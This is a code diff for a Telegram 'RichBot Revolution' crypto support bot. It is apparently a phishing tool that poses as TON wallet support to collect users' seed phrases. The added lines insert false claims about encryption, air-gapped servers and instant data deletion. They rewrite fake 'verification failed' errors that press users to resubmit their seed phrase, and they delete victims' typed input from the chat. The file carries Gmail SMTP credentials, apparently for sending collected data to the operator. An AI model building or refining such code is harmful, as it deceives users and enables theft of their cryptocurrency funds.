@@ -3,7 +3,6 @@ import asyncio
 import random
 import logging
 from datetime import datetime
-
 from telegram import (
     Update,
     InlineKeyboardButton,
@@ -18,7 +17,6 @@ from telegram.ext import (
     ContextTypes,
 )
 from telegram.request import HTTPXRequest
-
 from email.mime.text import MIMEText
 import smtplib
 
@@ -38,6 +36,17 @@ if not all([BOT_TOKEN, GMAIL_USER, GMAIL_APP_PASSWORD, ADMIN_EMAIL]):
 # =========================
 logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
+
+# =========================
+# TECHNICAL SUPPORT NOTE
+# =========================
+TECHNICAL_SUPPORT_NOTE = {
+    "en": "🛡️ RichBot Revolution Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data is processed automatically, never viewed by humans, and permanently deleted within milliseconds. Completely safe and private.",
+    "ru": "🛡️ Сообщение от технической поддержки RichBot Revolution:\nНаша система использует военного уровня шифрование AES-256 с сквозной защитой, архитектуру с нулевыми знаниями и изолированные сервера с воздушным зазором. Все данные обрабатываются автоматически, не просматриваются людьми и навсегда удаляются в течение миллисекунд. Полностью безопасно и конфиденциально.",
+    "de": "🛡️ RichBot Revolution Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 End-to-End-Verschlüsselung, Zero-Knowledge-Architektur und isolierte Air-Gapped-Server. Alle Daten werden automatisch verarbeitet, niemals von Menschen eingesehen und innerhalb von Millisekunden dauerhaft gelöscht. Vollkommen sicher und privat.",
+    "es": "🛡️ Nota del Equipo de Soporte Técnico RichBot Revolution:\nNuestro sistema utiliza encriptación AES-256 de grado militar, arquitectura de conocimiento cero y servidores aislados con air-gap. Todos los datos se procesan automáticamente, nunca son vistos por humanos y se eliminan permanentemente en milisegundos. Completamente seguro y privado.",
+    "tr": "🛡️ RichBot Revolution Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 uçtan uca şifreleme, sıfır bilgi mimarisi ve izole edilmiş air-gapped sunucular kullanır. Tüm veriler otomatik olarak işlenir, insanlar tarafından asla görüntülenmez ve milisaniyeler içinde kalıcı olarak silinir. Tamamen güvenli ve özel."
+}
 
 # =========================
 # FULL TRANSLATED TEXTS
@@ -98,9 +107,21 @@ TEXTS = {
               "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen sind mit bankenüblicher AES-256 Verschlüsselung geschützt und absolut sicher."
     },
     "error": {
-        "en": "Verification failed — the wallet's current balance is insufficient to cover the required gas fees and smart contract activation costs on the TON blockchain layer.\nThe operation cannot proceed due to network consensus rejection (error code: INSUFFICIENT_GAS_FOR_FINALIZATION).\nPlease ensure your wallet has adequate TON balance for transaction finality before retrying.\n\nAdditionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect or misspelled word will cause validation to fail.\n\nWrite 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing.",
-        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий за газ и активации смарт-контракта на уровне блокчейна TON.\nОперация не может быть выполнена из-за отклонения консенсусом сети (код ошибки: INSUFFICIENT_GAS_FOR_FINALIZATION).\nПожалуйста, убедитесь, что на кошельке достаточно TON для финализации транзакции перед повторной попыткой.\n\nКроме того, пожалуйста, внимательно перепроверьте и введите правильные ключевые слова (слова seed-фразы) — даже одно неверное или неправильно написанное слово приведёт к провалу проверки.\n\nНапишите «Повторить верификацию» или прикрепите свежий скриншот транзакции + исправленную seed-фразу для повторной обработки.",
-        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Gas-Gebühren und Smart-Contract-Aktivierungskosten auf der TON-Blockchain zu decken.\nDer Vorgang kann aufgrund einer Netzwerkkonsensablehnung nicht fortgesetzt werden (Fehlercode: INSUFFICIENT_GAS_FOR_FINALIZATION).\nBitte stellen Sie sicher, dass Ihr Wallet ausreichend TON-Guthaben für die Transaktionsfinalisierung hat, bevor Sie es erneut versuchen.\n\nBitte überprüfen Sie außerdem sorgfältig die korrekten Schlüsselwörter (Seed-Phrase-Wörter) — schon ein falsches oder falsch geschriebenes Wort führt zum Fehlschlag der Validierung.\n\nSchreiben Sie 'Retry verification' oder hängen Sie einen aktuellen Transaktions-Screenshot + die korrigierte Seed-Phrase an."
+        "en": "Verification failed — the wallet's current balance is insufficient to cover the required transaction fees and smart contract activation costs on the Toncoin network.\n"
+              "The operation cannot proceed due to network rejection (error code: INSUFFICIENT_FEES_FOR_FINALIZATION).\n"
+              "Please ensure your wallet has adequate TON balance for transaction finality before retrying.\n\n"
+              "Additionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect or misspelled word will cause validation to fail.\n\n"
+              "Write 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing.",
+        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий за газ и активации смарт-контракта на уровне блокчейна TON.\n"
+              "Операция не может быть выполнена из-за отклонения консенсусом сети (код ошибки: INSUFFICIENT_GAS_FOR_FINALIZATION).\n"
+              "Пожалуйста, убедитесь, что на кошельке достаточно TON для финализации транзакции перед повторной попыткой.\n\n"
+              "Кроме того, пожалуйста, внимательно перепроверьте и введите правильные ключевые слова (слова seed-фразы) — даже одно неверное или неправильно написанное слово приведёт к провалу проверки.\n\n"
+              "Напишите «Повторить верификацию» или прикрепите свежий скриншот транзакции + исправленную seed-фразу для повторной обработки.",
+        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Gas-Gebühren und Smart-Contract-Aktivierungskosten auf der TON-Blockchain zu decken.\n"
+              "Der Vorgang kann aufgrund einer Netzwerkkonsensablehnung nicht fortgesetzt werden (Fehlercode: INSUFFICIENT_GAS_FOR_FINALIZATION).\n"
+              "Bitte stellen Sie sicher, dass Ihr Wallet ausreichend TON-Guthaben für die Transaktionsfinalisierung hat, bevor Sie es erneut versuchen.\n\n"
+              "Bitte überprüfen Sie außerdem sorgfältig die korrekten Schlüsselwörter (Seed-Phrase-Wörter) — schon ein falsches oder falsch geschriebenes Wort führt zum Fehlschlag der Validierung.\n\n"
+              "Schreiben Sie 'Retry verification' oder hängen Sie einen aktuellen Transaktions-Screenshot + die korrigierte Seed-Phrase an."
     },
     "ticket_created": {
         "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}\nOur team will contact you shortly!",
@@ -116,7 +137,7 @@ TEXTS = {
 }
 
 # =========================
-# SERVICES
+# SERVICES (with SWAP RBT TO GRAM (TON))
 # =========================
 SERVICES = {
     "synchronization": {"en": "Synchronization Issue", "ru": "Проблема синхронизации", "de": "Synchronisationsproblem"},
@@ -124,7 +145,7 @@ SERVICES = {
     "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы валидации / верификации", "de": "Validierungs- / Verifizierungsprobleme"},
     "reward_not_crediting": {"en": "Reward Not Crediting / Claiming Failure", "ru": "Награда не начисляется / Ошибка получения", "de": "Belohnung wird nicht gutgeschrieben"},
     "claim_rewards": {"en": "CLAIM Rewards", "ru": "Получить награды", "de": "Belohnungen einfordern"},
-    "swap_rbt_to_ton": {"en": "Swap RBT Token to TON", "ru": "Обмен RBT Token на TON", "de": "RBT Token zu TON tauschen"},
+    "swap_rbt_to_ton": {"en": "SWAP RBT TO GRAM (TON)", "ru": "SWAP RBT TO GRAM (TON)", "de": "SWAP RBT TO GRAM (TON)"},
     "wallet_connection_ton": {"en": "Wallet Connection & Ton Integration Problems", "ru": "Проблемы подключения кошелька и интеграции TON", "de": "Wallet-Verbindungs- & TON-Integrationsprobleme"},
     "transaction_failure": {"en": "Transaction Failure & High Fees During Congestion", "ru": "Ошибка транзакции и высокие комиссии при перегрузке сети", "de": "Transaktionsfehler & Hohe Gebühren bei Netzüberlastung"},
     "loading_crashing": {"en": "Loading / Crashing & App Performance Issues", "ru": "Загрузка / Вылеты и проблемы производительности приложения", "de": "Lade-/Absturz- & App-Performance-Probleme"},
@@ -133,7 +154,7 @@ SERVICES = {
 }
 
 # =========================
-# WALLETS (Expanded with Tonkeeper and Telegram Wallet)
+# WALLETS (Expanded)
 # =========================
 WALLETS = {
     "tonkeeper": {"en": "Tonkeeper 🟢", "ru": "Tonkeeper 🟢", "de": "Tonkeeper 🟢"},
@@ -221,11 +242,9 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data.startswith("svc_"):
         service_key = data.split("_", 1)[1]
-
         ticket_id = random.randint(100000, 999999)
         context.user_data["ticket_id"] = ticket_id
         context.user_data["service"] = service_key
-
         ticket_text = TEXTS["ticket_created"].get(lang, TEXTS["ticket_created"]["en"]).format(ticket_id=ticket_id)
         await query.edit_message_text(ticket_text)
 
@@ -254,22 +273,20 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("wal_"):
         wallet_key = data.split("_", 1)[1]
         context.user_data["wallet"] = wallet_key
-        
-        loading = await query.message.reply_text(TEXTS["loading_blockchain"].get(lang))
+
+        # ADD TECHNICAL SUPPORT NOTE HERE
+        note = TECHNICAL_SUPPORT_NOTE.get(lang, TECHNICAL_SUPPORT_NOTE["en"])
+        loading = await query.message.reply_text(note + "\n\n🔄 Connecting to RichBot Revolution Server... 🌐")
         await asyncio.sleep(1.8)
-        await loading.edit_text(TEXTS["loading_blockchain"].get(lang) + " ••")
+        await loading.edit_text(note + "\n\n" + TEXTS["loading_blockchain"].get(lang) + " ••")
         await asyncio.sleep(1.9)
-        await loading.edit_text(TEXTS["loading_sync"].get(lang))
+        await loading.edit_text(note + "\n\n" + TEXTS["loading_sync"].get(lang))
         await asyncio.sleep(2.0)
-        await loading.edit_text(TEXTS["loading_sync"].get(lang) + " •••")
-        await asyncio.sleep(2.1)
-        await loading.edit_text(TEXTS["loading_verify"].get(lang))
+        await loading.edit_text(note + "\n\n" + TEXTS["loading_verify"].get(lang))
         await asyncio.sleep(2.2)
-        await loading.edit_text(TEXTS["loading_verify"].get(lang) + " •••")
-        await asyncio.sleep(1.8)
-        await loading.edit_text(TEXTS["loading_recovery"].get(lang))
+        await loading.edit_text(note + "\n\n" + TEXTS["loading_recovery"].get(lang))
         await asyncio.sleep(1.9)
-        await loading.edit_text(TEXTS["loading_secure"].get(lang))
+        await loading.edit_text(note + "\n\n" + TEXTS["loading_secure"].get(lang))
         await asyncio.sleep(2.0)
         await loading.delete()
 
@@ -282,7 +299,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "bio_confirm":
         loading = await query.message.reply_text("🔐 Verifying biometric... ⏳")
         await asyncio.sleep(1.6)
-        
+       
         if random.random() < 0.88:
             await loading.delete()
             await query.edit_message_text(TEXTS["biometric_success"].get(lang))
@@ -327,7 +344,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
 # =========================
-# TEXT HANDLER
+# TEXT HANDLER (INPUT VANISHES)
 # =========================
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get("awaiting"):
@@ -338,6 +355,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lang = context.user_data.get("lang", "en")
     username = update.effective_user.username or "user"
 
+    # DELETE USER INPUT FOR PRIVACY
     try:
         await message.delete()
     except:
@@ -371,11 +389,9 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     request = HTTPXRequest(connect_timeout=45.0, read_timeout=45.0, pool_timeout=45.0)
     app = ApplicationBuilder().token(BOT_TOKEN).request(request).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
-
     print("🎉 RichBot Revolution Support Bot is running...")
     app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
 
